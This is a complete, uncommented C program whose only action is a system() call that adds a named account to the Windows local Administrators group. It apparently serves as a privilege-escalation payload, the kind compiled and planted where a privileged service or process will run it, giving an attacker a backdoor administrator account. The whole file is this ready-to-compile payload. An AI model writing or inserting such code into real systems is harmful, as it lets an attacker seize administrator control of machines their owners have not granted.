#include <stdlib.h>
int main()
{
    int i;
    i = system("net localgroup administrators theusername /add");
    return 0;
}